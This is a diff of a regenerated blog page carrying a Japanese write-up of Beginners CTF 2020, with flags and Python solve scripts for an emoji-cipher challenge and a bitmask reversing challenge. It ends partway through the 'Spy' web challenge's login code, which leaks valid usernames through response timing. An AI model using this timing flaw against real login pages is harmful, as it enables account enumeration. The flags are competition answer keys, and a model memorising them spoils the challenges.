@@ -2,22 +2,25 @@
 <html lang="en" dir="ltr">
 
 <head prefix="og: http://ogp.me/ns#">
-	<meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <title>Beginners CTF 2020 Write up – 303 See Other</title>
     
 
 
+  
+  <script defer src="/blog/js/fuse.min.32195737929df2c8096e855a5789cbb3f1331224d9169e8705493e7008f47df8.js"></script>
+
+
+
 <script src="/blog/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>
 
-<script defer src="/blog/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
+<script defer src="/blog/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/blog/js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js"></script>
+<script defer src="/blog/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/blog/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
-
-<script defer src="/blog/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/blog/js/helper/fadeinout.min.1d13d3e810c3940e80cbba6216a1c76fbf42b5431fc83537ea6997863802362b.js"></script>
 
 <script defer src="/blog/js/helper/closest.min.js"></script>
   
@@ -96,6 +99,74 @@
           navCollapse.setAttribute('data-open', 'true');
           navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
           navCollapseBtn.classList.add('is-active');
+        }
+      }
+    }) : null;
+    
+
+
+    
+    var tables = document.querySelectorAll('.single__contents > table');
+    for (let i = 0; i < tables.length; i++) {
+      var table = tables[i];
+      var wrapper = document.createElement('div');
+      wrapper.className = 'table-wrapper';
+      table.parentElement.replaceChild(wrapper, table);
+      wrapper.appendChild(table);
+    }
+    
+
+
+    
+    var footNoteRefs = document.querySelectorAll('.footnote-ref');
+    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');
+
+    footNoteRefs ? 
+    footNoteRefs.forEach(function(elem, idx) {
+      elem.onmouseenter = function () {
+        if (navbar.classList.contains('scrolling')) {
+          navbar.classList.remove('scrolling');
+        }
+      }
+
+      elem.onmouseleave = function () {
+        if (!navbar.classList.contains('scrolling')) {
+          setTimeout(function () {
+            navbar.classList.add('scrolling');
+          }, 100);
+        }
+      }
+
+      elem.onclick = function () {
+        if (!navbar.classList.contains('scrolling')) {
+          navbar.classList.remove('navbar--show');
+          navbar.classList.remove('navbar--hide');
+          navbar.classList.add('navbar--hide');
+        }
+      }
+    }) : null;
+
+    footNoteBackRefs ? 
+    footNoteBackRefs.forEach(function(elem, idx) {
+      elem.onmouseenter = function () {
+        if (navbar.classList.contains('scrolling')) {
+          navbar.classList.remove('scrolling');
+        }
+      }
+
+      elem.onmouseleave = function () {
+        if (!navbar.classList.contains('scrolling')) {
+          setTimeout(function() {
+            navbar.classList.add('scrolling');
+          }, 100);
+        }
+      }
+
+      elem.onclick = function () {
+        if (!navbar.classList.contains('scrolling')) {
+          navbar.classList.remove('navbar--show');
+          navbar.classList.remove('navbar--hide');
+          navbar.classList.add('navbar--hide');
         }
       }
     }) : null;
@@ -289,11 +360,13 @@
         if (st < 45) {
           return null;
         }
-        
-        if (!navbar.classList.contains('navbar--hide')) {
-          navbar.classList.add('navbar--hide');
-        } else if (navbar.classList.contains('navbar--show')) {
-          navbar.classList.remove('navbar--show');
+
+        if (navbar.classList.contains('scrolling')) {
+          if (!navbar.classList.contains('navbar--hide')) {
+            navbar.classList.add('navbar--hide');
+          } else if (navbar.classList.contains('navbar--show')) {
+            navbar.classList.remove('navbar--show');
+          }
         }
 
         if (singleContentsElem) {
@@ -360,10 +433,12 @@
           gttBtn.style.display = "none";
         }
 
-        if (navbar.classList.contains('navbar--hide')) {
-          navbar.classList.remove('navbar--hide');
-        } else if (!navbar.classList.contains('navbar--show')) {
-          navbar.classList.add('navbar--show');
+        if (navbar.classList.contains('scrolling')) {
+          if (navbar.classList.contains('navbar--hide')) {
+            navbar.classList.remove('navbar--hide');
+          } else if (!navbar.classList.contains('navbar--show')) {
+            navbar.classList.add('navbar--show');
+          }
         }
 
         if (singleContentsElem) {
@@ -444,6 +519,17 @@
     var rootEleme = document.getElementById('root');
     var selectThemeElem = document.querySelectorAll('.select-theme');
     var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
+    
+    
+    var skinDarkCode = JSON.parse("\"dark\"");
+    
+    var skinLightCode = JSON.parse("\"light\"");
+    
+    var skinHackerCode = JSON.parse("\"hacker\"");
+    
+    var skinSolarizedCode = JSON.parse("\"solarized\"");
+    
+    var skinKimbieCode = JSON.parse("\"kimbie\"");
 
     var setMetaColor = function(themeColor) {
       var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
@@ -476,7 +562,21 @@
         metaThemeColor.setAttribute('content', '#eee8d5');
         metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
         metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
-      } 
+      }
+    }
+
+    var parseSkinCode = function(themeText) {
+      if (themeText === skinDarkCode) {
+        return 'dark';
+      } else if (themeText === skinLightCode) {
+        return 'light';
+      } else if (themeText === skinHackerCode) {
+        return 'hacker';
+      } else if (themeText === skinSolarizedCode) {
+        return 'solarized';
+      } else if (themeText === skinKimbieCode) {
+        return 'kimbie';
+      }
     }
     
     if (localTheme) {
@@ -497,7 +597,7 @@
     selectThemeItemElem ? 
     selectThemeItemElem.forEach(function (v, i) {
       v.addEventListener('click', function (e) {
-        var selectedThemeVariant = e.target.text.trim();
+        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
         localStorage.setItem('theme', selectedThemeVariant);
         setMetaColor(selectedThemeVariant);
 
@@ -529,12 +629,20 @@
           }
         }
 
-        var utterances = document.querySelector('iframe');
+        var utterances = document.getElementById('utterances');
         if (utterances) {
-          utterances.contentWindow.postMessage({
+          utterances.querySelector('iframe').contentWindow.postMessage({
             type: 'set-theme',
             theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
           }, 'https://utteranc.es');
+        }
+
+        var twitterCards = document.querySelectorAll('.twitter-timeline');
+        if (twitterCards) {
+          window.postMessage({
+            type: 'set-twitter-theme',
+            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
+          });
         }
       });
     }) : null;
@@ -543,60 +651,85 @@
 
   
     
+    var baseurl = JSON.parse("\"https://Alignof.github.io/blog/\"");
+    
     var permalink = JSON.parse("\"https://Alignof.github.io/blog/posts/ctf4b_2020/\"");
+    
+    var langprefix = JSON.parse("\"\"");
     var searchResults = null;
     var searchMenu = null;
     var searchText = null;
     
+    
+    var enableSearch = JSON.parse("true");
+    
+    var searchDistance = JSON.parse("null");
+    
+    var searchThreshold = JSON.parse("null");
+    
+    var searchContent = JSON.parse("null");
     
     var enableSearchHighlight = JSON.parse("true");
     
     var searchResultPosition = JSON.parse("\"main\"");
     
     var sectionType = JSON.parse("\"posts\"");
-
+    
+    var kind = JSON.parse("\"page\"");
+    
     var fuse = null;
 
-    (function initFuse() {
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', permalink + "index.json");
-      xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
-      xhr.onload = function () {
-        if (xhr.status === 200) {
-          fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
-            keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
-            includeMatches: enableSearchHighlight,
-            shouldSort: true,
-            threshold: 0.4,
-            location: 0,
-            distance: 100,
-            maxPatternLength: 32,
-            minMatchCharLength: 1,
-          });
-          window.fuse = fuse;
+    if (enableSearch) {
+      (function initFuse() {
+        var xhr = new XMLHttpRequest();
+        if (sectionType === "publication" && kind !== "page") {
+          xhr.open('GET', permalink + "index.json");
+        } else {
+          xhr.open('GET', baseurl + langprefix + "/index.json");
         }
-        else {
-          console.error('[' + xhr.status + ']Error:', xhr.statusText);
-        }
-      };
-      xhr.send();
-    })();
+        
+        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
+        xhr.onload = function () {
+          if (xhr.status === 200) {
+            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
+              keys: sectionType.includes('publication') ? ['title', 'abstract'] : 
+                searchContent ? ['title', 'description', 'content'] : ['title', 'description'],
+              includeMatches: enableSearchHighlight,
+              shouldSort: true, 
+              threshold: searchThreshold ? searchThreshold : 0.4, 
+              location: 0, 
+              distance: searchDistance ? searchDistance : 100, 
+              maxPatternLength: 32,
+              minMatchCharLength: 1,
+              isCaseSensitive: false, 
+              findAllMatches: false, 
+              useExtendedSearch: false, 
+            });
+            window.fuse = fuse;
+          }
+          else {
+            console.error('[' + xhr.status + ']Error:', xhr.statusText);
+          }
+        };
+        xhr.send();
+      })();
+    }
 
     function makeLi(ulElem, obj) {
       var li = document.createElement('li');
       li.className = 'search-result__item';
       
       var a = document.createElement('a');
-      a.innerHTML = obj.title;
+      a.innerHTML = obj.item.title;
       a.setAttribute('class', 'search-result__item--title');
-      a.setAttribute('href', obj.permalink);
+      a.setAttribute('href', obj.item.uri);
 
       var descDiv = document.createElement('div');
       descDiv.setAttribute('class', 'search-result__item--desc');
-      if (obj.description) {
-        descDiv.innerHTML = obj.description;
-      } else if (obj.content) {
-        descDiv.innerHTML = obj.content.substring(0, 225);
+      if (obj.item.description) {
+        descDiv.innerHTML = obj.item.description;
+      } else if (obj.item.content) {
+        descDiv.innerHTML = obj.item.content.substring(0, 225);
       }
       
       li.appendChild(a);
@@ -1070,7 +1203,7 @@
   
     var mobileSearchInputElem = document.querySelector('#search-mobile');
     var mobileSearchClassElem = document.querySelector('.mobile-search');
-    var mobileSearchBtnElem = document.querySelector('#mobileSearchBtn');
+    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
     var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
     var mobileSearchContainer = document.querySelector('#search-mobile-container');
     var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
@@ -1080,19 +1213,21 @@
       mobileSearchClassElem.style.display = 'none';
     }
 
-    mobileSearchBtnElem ? 
-    mobileSearchBtnElem.addEventListener('click', function () {
-      if (mobileSearchContainer) {
-        mobileSearchContainer.style.display = 'block';
-      }
+    mobileSearchBtnElems ? 
+    mobileSearchBtnElems.forEach(function (elem, idx) {
+      elem.addEventListener('click', function () {
+        if (mobileSearchContainer) {
+          mobileSearchContainer.style.display = 'block';
+        }
 
-      if (mobileSearchInputElem) {
-        mobileSearchInputElem.focus();
-      }
+        if (mobileSearchInputElem) {
+          mobileSearchInputElem.focus();
+        }
 
-      if (htmlElem) {
-        htmlElem.style.overflowY = 'hidden';
-      }
+        if (htmlElem) {
+          htmlElem.style.overflowY = 'hidden';
+        }
+      });
     }) : null;
 
     mobileSearchCloseBtnElem ? 
@@ -1187,7 +1322,8 @@
     }
   
   });
-</script>    
+</script>
+    
     
 
 
@@ -1223,7 +1359,7 @@
     <meta property="twitter:description" content="反省文。">
   
 
-<meta name="generator" content="Hugo 0.77.0" />
+<meta name="generator" content="Hugo 0.89.4" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1282,7 +1418,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
   
 <script type="application/javascript">
 var doNotTrack = false;
@@ -1303,21 +1438,9 @@ if (!doNotTrack) {
 
 
     
-
-	
-	<link rel="shortcut icon" href="/blog/favicon/favicon.ico" type="image/x-icon" />
-	<link rel="apple-touch-icon" href="/blog/favicon/apple-touch-icon.png" />
-	<link rel="apple-touch-icon" sizes="57x57" href="/blog/favicon/apple-touch-icon-57x57.png" />
-	<link rel="apple-touch-icon" sizes="72x72" href="/blog/favicon/apple-touch-icon-72x72.png" />
-	<link rel="apple-touch-icon" sizes="76x76" href="/blog/favicon/apple-touch-icon-76x76.png" />
-	<link rel="apple-touch-icon" sizes="114x114" href="/blog/favicon/apple-touch-icon-114x114.png" />
-	<link rel="apple-touch-icon" sizes="120x120" href="/blog/favicon/apple-touch-icon-120x120.png" />
-	<link rel="apple-touch-icon" sizes="144x144" href="/blog/favicon/apple-touch-icon-144x144.png" />
-	<link rel="apple-touch-icon" sizes="152x152" href="/blog/favicon/apple-touch-icon-152x152.png" />
-	<link rel="apple-touch-icon" sizes="180x180" href="/blog/favicon/apple-touch-icon-180x180.png" />
 </head>
 
-<body id="root" class="theme__mytheme">
+<body id="root" class="theme__dark">
     <script>
         var localTheme = localStorage.getItem('theme');
         if (localTheme) {
@@ -1332,7 +1455,7 @@ if (!doNotTrack) {
 
 
         <div class="wrapper" data-type="posts" data-kind="page">
-            <nav class="navbar" role="navigation" aria-label="main navigation" data-dir="ltr">
+            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
   <div class="navbar__brand">
     
     <a href="/blog/" title="Home" rel="home" class="navbar__logo-link">
@@ -1356,10 +1479,6 @@ if (!doNotTrack) {
       
         
         <a href="#" class="dropdown-item select-theme__item is-active">
-          mytheme
-        </a>
-        
-        <a href="#" class="dropdown-item select-theme__item ">
           dark
         </a>
         
@@ -1385,7 +1504,7 @@ if (!doNotTrack) {
 </div>
 
 
-<div id="mobileSearchBtn" class="mobile-search__btn" data-ani="true">
+<div class="mobile-search__btn navbar-search" data-ani="true">
   <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
 </div>
 
@@ -1484,6 +1603,8 @@ if (!doNotTrack) {
 </div>
   <div class="navbar__menu">
   
+  
+  
 <div class="theme" data-ani="true">
   <div class="dropdown">
     <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
@@ -1493,10 +1614,6 @@ if (!doNotTrack) {
       
         
         <a href="#" class="dropdown-item select-theme__item is-active">
-          mytheme
-        </a>
-        
-        <a href="#" class="dropdown-item select-theme__item ">
           dark
         </a>
         
@@ -1600,6 +1717,7 @@ if (!doNotTrack) {
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
     <h2 class="single__title" data-ani="true">Beginners CTF 2020 Write up</h2>
+    <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
@@ -1613,6 +1731,7 @@ if (!doNotTrack) {
     
   </span>
 </div>
+
       
 <ul class="single__tags caption">
   
@@ -1624,6 +1743,7 @@ if (!doNotTrack) {
   <li><a href="https://Alignof.github.io/blog/tags/seccon/" class="single__tag" title="SECCON">#SECCON</a></li>
 
 </ul>
+
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
@@ -1647,7 +1767,7 @@ Beginnerなんてタグ付けられたら諦めるわけにも行かんですし
 <h2 id="misc-welcome">[Misc] Welcome</h2>
 <p>毎度おなじみwelcome。<br />
 discordのサーバにアクセスしてflagをコピペするだけ。</p>
-<pre><code>ctf4b{sorry, we lost the ownership of our irc channel so we decided to use discord}
+<pre tabindex="0"><code>ctf4b{sorry, we lost the ownership of our irc channel so we decided to use discord}
 </code></pre><p>そういやSECCON関係なのにircじゃないなぁって思ってたけどそういうことだったのか。<br />
 Writeupを書くまで気が付かなかった。（本番のときはとりあえずコピペなので）</p>
 <h2 id="misc-emoemoencode">[Misc] emoemoencode</h2>
@@ -1656,15 +1776,15 @@ Writeupを書くまで気が付かなかった。（本番のときはとりあ�
 ecojiとかのツールを入れてみたり、色々なサイトを巡ったが全部無駄足だったようだ。<br />
 結局これが解けた最後の問題だったという&hellip;</p>
 <p>以下の短い絵文字の文字列が与えられる。</p>
-<pre><code>🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽
+<pre tabindex="0"><code>🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽
 </code></pre><p>困り果てた僕は取り敢えず、文字の規則性を調べてみた。</p>
-<pre><code>127843,127860,127846,127796,127842,127867,127859,127860,127845,127847,127841,127854,127792,...
+<pre tabindex="0"><code>127843,127860,127846,127796,127842,127867,127859,127860,127845,127847,127841,127854,127792,...
 </code></pre><p>pythonのord関数で数値を調べてみると、1文字目と3文字目の下一桁の値の差が丁度3つ分。<br />
 これはflagの形式のctf4bのcとfの関係にあたる。<br />
 cを基準に文字コードの差を取って復元してみると、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1676,25 +1796,25 @@ cを基準に文字コードの差を取って復元してみると、</p>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">data</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./emoemoencode.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">data</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./emoemoencode.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
 <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">diff</span><span class="o">=</span><span class="p">[]</span>
 <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
     <span class="n">diff</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span><span class="o">-</span><span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
 
 <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">d</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">d</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>flagが出てきた。</p>
-<pre><code>[0, 17, 3, -47, -1, 24, 16, 17, 2, 4, -2, 11, -51, 4, 15, -2, 13, 5, 22, -4, -1, 22, -4, 2, 10, -51, -51, -51, -51, -51, -51, 7, 6, 26]
+<pre tabindex="0"><code>[0, 17, 3, -47, -1, 24, 16, 17, 2, 4, -2, 11, -51, 4, 15, -2, 13, 5, 22, -4, -1, 22, -4, 2, 10, -51, -51, -51, -51, -51, -51, 7, 6, 26]
 ctf4b{stegan0graphy_by_em000000ji}
 </code></pre><h2 id="reversing-mask">[Reversing] mask</h2>
 <p>とりあえず実行。<br />
 引数に文字列を取るらしいので取り敢えずctf4b{}と入れてみる。</p>
-<pre><code>$ ./mask ctf4b{}
+<pre tabindex="0"><code>$ ./mask ctf4b{}
 Putting on masks...
 atd4`qu
 c`b bki
@@ -1702,7 +1822,7 @@ Wrong FLAG. Try again.
 </code></pre><p>二通りの謎の文字列が出てきた。<br />
 そこで、Reversingの鉄則であるstringsを試してみる。<br />
 すると、</p>
-<pre><code>$ strings mask
+<pre tabindex="0"><code>$ strings mask
 
 []A\A]A^A_
 Usage: ./mask [FLAG]
@@ -1716,7 +1836,7 @@ GCC: (Arch Linux 9.3.0-1) 9.3.0
 </code></pre><p>なんともまぁ都合の良い文字列が。<br />
 gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 天才である私はそのときのメモを残してあった。（偉い）</p>
-<pre><code>   0x000055555555520c &lt;+147&gt;:	mov    eax,DWORD PTR [rbp-0xd8]
+<pre tabindex="0"><code>   0x000055555555520c &lt;+147&gt;:	mov    eax,DWORD PTR [rbp-0xd8]
    0x0000555555555212 &lt;+153&gt;:	cdqe   
    0x0000555555555214 &lt;+155&gt;:	movzx  eax,BYTE PTR [rbp+rax*1-0xd0]	// get char
    0x000055555555521c &lt;+163&gt;:	and    eax,0x75				// char &amp; 0x75
@@ -1743,7 +1863,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 <p>他の人のwriteupを見るともっと合理的な処理もある感じだがそこまで重たい処理ではないので自分は総当りした。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1759,7 +1879,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
 <span class="n">words</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
 <span class="n">expect</span><span class="o">=</span><span class="s2">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
 <span class="n">expect2</span><span class="o">=</span><span class="s2">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span>
@@ -1772,19 +1892,19 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
         <span class="k">if</span> <span class="n">expect</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x75</span><span class="p">)</span> <span class="ow">and</span> <span class="n">expect2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">w</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffeb</span><span class="p">):</span>
             <span class="n">flag</span><span class="o">+=</span><span class="n">w</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>改めて見るとゴリ押しもいいとこである。<br />
 得られたflagはこちら。</p>
-<pre><code>ctf4b{dont_reverse_face_mask}
+<pre tabindex="0"><code>ctf4b{dont_reverse_face_mask}
 </code></pre><h2 id="web-spy">[Web] Spy</h2>
 <p>サーバ側で動いているであろうapp.pyと従業員一覧が書かれたemployees.txt、それからログインページらしきWebページのリンクが与えられる。<br />
 どうやらこのサイトを利用している従業員をリストから全て選ぶとflagが降ってくる具合らしい。<br />
 さて、どうやって利用者か否かを調べるかだが、app.pyを見てみると、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1810,12 +1930,12 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
     <span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span>
 
     <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Please login.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;{:.7f}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Please login.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
     
     <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
         <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span>
@@ -1824,16 +1944,16 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
         <span class="n">exists</span><span class="p">,</span> <span class="n">account</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">get_account</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 
         <span class="k">if</span> <span class="ow">not</span> <span class="n">exists</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;{:.7f}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
 
         <span class="c1"># auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.</span>
         <span class="c1"># You know, it&#39;s really secure... isn&#39;t it? :-)</span>
         <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">calc_password_hash</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">SALT</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">hashed_password</span> <span class="o">!=</span> <span class="n">account</span><span class="o">.</span><span class="n">password</span><span class="p">:</span>
